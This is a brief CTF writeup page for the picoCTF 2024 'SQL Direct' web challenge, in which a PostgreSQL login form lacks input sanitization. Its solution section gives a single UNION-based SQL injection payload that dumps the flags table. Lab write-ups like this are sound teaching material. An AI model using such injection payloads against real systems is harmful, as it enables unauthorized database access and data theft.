---
layout: page
title: "SQL Direct - picoCTF 2024 Writeup"
subtitle: "PostgreSQL login form with no input sanitization. Classic UNION-based SQL injection to dump the flags table."
permalink: /ctf/writeups/challenges/web/sql-direct/
category: "web"
challenge_name: "SQL Direct"
difficulty: "Easy"
event: "picoCTF 2024"
points: "200"
solves: "5,100"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: picoCTF 2024
* **Difficulty**: Easy
* **Points**: 200
* **Solves**: 5,100
* **Category**: Web
* **Tags**: SQLi, UNION, PostgreSQL

---

## 📝 Description
PostgreSQL login form with no input sanitization. Classic UNION-based SQL injection to dump the flags table.

---

## 💡 Solution / Approach
```python
' UNION SELECT flag,null FROM flags--
```
